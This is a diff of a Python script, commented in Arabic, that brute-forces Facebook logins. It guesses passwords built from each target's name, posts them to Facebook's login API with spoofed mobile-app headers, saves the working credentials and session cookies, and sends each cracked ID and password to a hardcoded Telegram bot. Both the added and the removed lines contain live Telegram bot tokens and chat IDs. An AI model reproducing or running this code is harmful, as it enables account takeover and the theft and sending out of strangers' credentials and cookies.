@@ -1,52 +1,111 @@
-import random
 import requests
-import re
+import uuid
+import random
+import base64
+import os
+import sys
+import time
+
+# استبدل بتوكن البوت الخاص بك ومعرف المحادثة الخاص بك
+TELEGRAM_BOT_TOKEN = "7170560287:AAH6Jx2CGjMrjpzX22EvY7HvBIXI1xsy0no"
+TELEGRAM_CHAT_ID = "5210419138"
+
+def send_message_to_telegram(id, password):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    message = f"ID: {id} | Password: {password}"
+    params = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
+    try:
+        response = requests.get(url, params=params)
+        response.raise_for_status()
+        print("Message sent to Telegram successfully!")
+    except requests.RequestException as e:
+        print(f"An error occurred while sending message to Telegram: {e}")
 
 def m1():
-    # قائمة من السلاسل النصية 
     user_agents = [
         "[FBAN/Orca-Android;FBAV/211.65.5.12;FBPN/com.facebook.orca;FBLC/en_US;FBBV/358680708;FBCR/Orange;FBMF/samsung;FBBD/samsung;FBDV/OnePlus 9 Pro;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.5,width=2560,height=1920};FB_FW/1;FBRV/872310439]",
         "[FBAN/Orca-Android;FBAV/211.65.5.12;FBPN/com.facebook.orca;FBLC/en_US;FBBV/358680708;FBCR/Orange;FBMF/samsung;FBBD/samsung;FBDV/OnePlus 9 Pro;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.5,width=2560,height=1920};FB_FW/1;FBRV/872310439]"
     ]
+    return ";".join(user_agents)
 
-    # دمج السلاسل النصية في سلسلة واحدة 
-    return ";".join(user_agents) 
-
-def send_message_to_telegram(token, chat_id, message):
-    url = f"https://api.telegram.org/bot{token}/sendMessage"
-    params = {"chat_id": chat_id, "text": message}
+def ffb1(sid, name, psw):
+    global oks, cps, loop
     try:
-        response = requests.get(url, params=params)
-        response.raise_for_status()
-        print("Message sent successfully!")
-    except requests.RequestException as e:
-        print(f"An error occurred: {e}")
+        sys.stdout.write('\r\r\033[1;37m [JEAB-M2] %s|\033[1;37mOK:-%s \033[1;37m' % (loop, len(oks)))
+        sys.stdout.flush()
+        
+        fs = name.split(' ')[0]
+        try:
+            ls = name.split(' ')[1]
+        except:
+            ls = fs
+        
+        for pw in psw:
+            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
+            with requests.Session() as session:
+                data = {
+                    "adid": str(uuid.uuid4()),
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": sid,
+                    "password": ps,
+                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_PK",
+                    "client_country_code": "PK",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"
+                }
+                headers = {
+                    'User-Agent': m1(),
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+                }
+                q = session.post("https://graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
+                    TM = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
+                    cookie = f"sb={TM};{ckkk}"
+                    print(f"\r{G} [JEAB-OK] {sid} [√] {ps} {W}")
+                    oks.append(sid)
+                    open('/sdcard/JEAB-M2-OK.txt', 'a').write(sid + '[√]' + ps + '\n')
+                    open('/sdcard/JEAB-M2-COOKIES.txt', 'a').write(sid + '[√]' + ps + '|' + cookie + '\n')
+                    # إرسال المعرف وكلمة المرور إلى بوت تلجرام
+                    send_message_to_telegram(sid, ps)
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    cps.append(sid)
+                    open('/sdcard/JEAB-M2-CP', 'a').write(sid + '[√]' + ps + '\n')
+                else:
+                    continue
+        loop += 1
+    except requests.exceptions.ConnectionError:
+        time.sleep(7)
+        ffb1(sid, name, psw)
 
-def Elite(id, ps):
-    token = "7170560287:AAH6Jx2CGjMrjpzX22EvY7HvBIXI1xsy0no"  # Add your bot token
-    chat_id = "5210419138"  # Add your chat ID
-    message = f"ID: {id} | Password: {ps}"
-    send_message_to_telegram(token, chat_id, message)
-
-def process_and_send_message(text):
-    # استخدام تعبير عادي للبحث عن ID و Password
-    id_match = re.search(r'ID:\s*(\S+)', text)
-    ps_match = re.search(r'Password:\s*(\S+)', text)
-    
-    if id_match and ps_match:
-        id = id_match.group(1)
-        ps = ps_match.group(1)
-        Elite(id, ps)
-    else:
-        print("No valid ID and Password found in the text.")
-
-# استخدام الدالة 
-user_agent = m1()
-headers = {'User-Agent': user_agent}
-message = "ID: example_id | Password: example_password"
-
-# ارسال الرسالة عبر API تلجرام
-requests.post(f'https://api.telegram.org/bot7244277412:AAFUXBZ1SjvF-z0hUGrJW3tS5jd8ropROVI/sendMessage?chat_id=5210419138&text={message}', headers=headers)
-
-# تحليل النصوص المرسلة
-process_and_send_message(message)
+# متغيرات عالمية (يجب تعيينها في مكان ما في الكود الخاص بك)
+oks = []
+cps = []
+loop = 0
